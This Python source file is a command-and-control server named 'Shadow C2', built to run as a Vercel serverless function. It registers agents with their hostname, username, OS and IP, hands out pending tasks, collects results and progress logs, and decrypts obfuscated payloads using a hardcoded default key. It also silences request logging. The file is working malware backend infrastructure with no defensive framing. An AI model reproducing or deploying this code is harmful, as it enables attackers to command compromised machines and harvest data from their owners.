"""
Shadow C2 — Vercel Serverless Function
All routes handled via ?route= query param
Uses Vercel's /tmp for ephemeral SQLite
"""
import os, json, sqlite3, hashlib, hmac, base64, time, urllib.parse
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler

SECRET_KEY  = os.environ.get("C2_SECRET_KEY", "TT_C2_RENDER_SECRET")
STATIC_SEED = os.environ.get("C2_STATIC_SEED", "TT_C2_RENDER_SECRET")
DB_PATH     = "/tmp/shadow_c2.db"

def _get_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    conn.execute("""CREATE TABLE IF NOT EXISTS agents (
        agent_id TEXT PRIMARY KEY, hostname TEXT, username TEXT,
        os TEXT, arch TEXT, ip TEXT, last_seen TEXT,
        status TEXT DEFAULT 'offline', extra TEXT DEFAULT ''
    )""")
    conn.execute("""CREATE TABLE IF NOT EXISTS tasks (
        task_id TEXT PRIMARY KEY, agent_id TEXT, action TEXT,
        args TEXT DEFAULT '{}', status TEXT DEFAULT 'pending',
        result TEXT DEFAULT '', progress_log TEXT DEFAULT '',
        issued_at TEXT
    )""")
    conn.commit()
    return conn

def _verify_key(provided):
    if not provided: return False
    if provided == SECRET_KEY: return True
    return False

def _decrypt(data_b64):
    try:
        raw = base64.b64decode(data_b64)
        nonce, tag, ct = raw[:12], raw[-6:], raw[12:-6]
        seed = STATIC_SEED
        prk = hmac.new(hashlib.sha256(seed.encode()).digest(), b"server-side", hashlib.sha256).digest()
        key = hmac.new(prk, b"shadow-c2-v2"+bytes([1]), hashlib.sha256).digest()[:32]
        exp = hmac.new(key, nonce+ct, hashlib.sha256).digest()[:6]
        if not hmac.compare_digest(tag, exp): return None
        ks = hashlib.sha256(key+nonce).digest() * (len(ct)//32+1)
        dec = bytes(a^b for a,b in zip(ct, ks))
        return json.loads(dec.decode())
    except: return None

def now_iso(): return datetime.now(timezone.utc).isoformat()

def new_task_id(db):
    row = db.execute("SELECT task_id FROM tasks ORDER BY rowid DESC LIMIT 1").fetchone()
    n = int(row["task_id"].split("_")[1]) if row else 0
    return f"task_{n+1:06d}"

def handle_c2(method, route, body):
    """Process C2 request and return JSON response"""
    if not route or route == "health":
        return 200, {"status": "ok", "c2": "Shadow C2 on Vercel", "ts": int(time.time())}

    if route in ["checkin", "result", "agents", "task", "get_result", "stats", "delete_agent"]:
        if not _verify_key(body.get("key", "")):
            return 401, {"error": "Unauthorized"}

    db = _get_db()
    try:
        if route == "checkin":
            aid = body.get("agent_id")
            if not aid:
                return 400, {"error": "missing agent_id"}
            db.execute("""INSERT INTO agents (agent_id,hostname,username,os,arch,ip,last_seen,status,extra)
                VALUES (?,?,?,?,?,?,?,'online',?) ON CONFLICT(agent_id) DO UPDATE SET
                hostname=excluded.hostname,username=excluded.username,os=excluded.os,
                arch=excluded.arch,ip=excluded.ip,last_seen=excluded.last_seen,status='online',extra=excluded.extra""",
                (aid, body.get("hostname","?"), body.get("username","?"),
                 body.get("os","?"), body.get("arch","?"), body.get("ip","?"),
                 now_iso(), body.get("extra","")))
            db.commit()
            row = db.execute("SELECT * FROM tasks WHERE agent_id=? AND status='pending' ORDER BY rowid ASC LIMIT 1",
                (aid,)).fetchone()
            if row:
                db.execute("UPDATE tasks SET status='sent' WHERE task_id=?", (row["task_id"],))
                db.commit()
                return 200, {"task_id": row["task_id"], "action": row["action"],
                    "args": json.loads(row["args"] or "{}")}
            return 200, {"task_id": None}

        elif route == "result":
            tid = body.get("task_id")
            if not tid:
                return 400, {"error": "missing task_id"}
            row = db.execute("SELECT * FROM tasks WHERE task_id=?", (tid,)).fetchone()
            if not row:
                return 404, {"error": "not found"}
            sv = body.get("status", "done")
            rv = body.get("result", "")
            if sv == "progress":
                ex = db.execute("SELECT progress_log FROM tasks WHERE task_id=?", (tid,)).fetchone()
                p = (ex[0] or "") if ex else ""
                db.execute("UPDATE tasks SET progress_log=? WHERE task_id=?", (p + rv + "\n", tid))
            else:
                db.execute("UPDATE tasks SET result=?,status=? WHERE task_id=?", (rv, sv, tid))
            db.commit()
            return 200, {"ok": True}

        elif route == "agents":
            rows = db.execute("SELECT * FROM agents").fetchall()
            result = []
            for r in rows:
                a = dict(r)
                try:
                    ls = datetime.fromisoformat(a.get("last_seen", "")).timestamp()
                    a["status"] = "online" if (datetime.now(timezone.utc).timestamp() - ls) <= 300 else "offline"
                except:
                    a["status"] = "offline"
                result.append(a)
            show_all = body.get("all", False)
            filtered = result if show_all else [a for a in result if a["status"] == "online"]
            return 200, {"agents": filtered, "total": len(result)}

        elif route == "task":
            aid = body.get("agent_id")
            act = body.get("action")
            if not aid or not act:
                return 400, {"error": "missing fields"}
            tid = new_task_id(db)
            db.execute("INSERT INTO tasks (task_id,agent_id,action,args,status,result,issued_at) VALUES (?,?,?,?,'pending','',?)",
                (tid, aid, act, json.dumps(body.get("args", {})), now_iso()))
            db.commit()
            return 200, {"task_id": tid}

        elif route == "get_result":
            tid = body.get("task_id")
            if not tid:
                return 400, {"error": "missing task_id"}
            row = db.execute("SELECT * FROM tasks WHERE task_id=?", (tid,)).fetchone()
            if not row:
                return 404, {"error": "not found"}
            d = dict(row)
            p = db.execute("SELECT progress_log FROM tasks WHERE task_id=?", (tid,)).fetchone()
            d["progress_log"] = (p[0] or "") if p else ""
            return 200, d

        elif route == "stats":
            t = db.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
            tk = db.execute("SELECT COUNT(*) FROM tasks").fetchone()[0]
            p = db.execute("SELECT COUNT(*) FROM tasks WHERE status='pending'").fetchone()[0]
            return 200, {"total_agents": t, "total_tasks": tk, "pending_tasks": p}

        elif route == "delete_agent":
            aid = body.get("agent_id")
            if aid:
                db.execute("DELETE FROM agents WHERE agent_id=?", (aid,))
                db.commit()
            return 200, {"ok": True}

        else:
            return 400, {"error": "unknown route"}

    except Exception as e:
        return 500, {"error": str(e)}
    finally:
        db.close()


class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self._handle_request("GET")

    def do_POST(self):
        self._handle_request("POST")

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def _handle_request(self, method):
        parsed = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed.query)
        route = query.get("route", [""])[0]

        body = {}
        if method == "POST":
            cl = int(self.headers.get("Content-Length", 0))
            if cl > 0:
                raw = self.rfile.read(cl)
                try:
                    raw_json = json.loads(raw.decode("utf-8"))
                    if "_e" in raw_json:
                        dec = _decrypt(raw_json["_e"])
                        if dec:
                            body = dec
                    else:
                        body = raw_json
                except:
                    body = {}

        if not route:
            route = body.get("route", "")

        status_code, data = handle_c2(method, route, body)

        self.send_response(status_code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode("utf-8"))

    def log_message(self, format, *args):
        pass
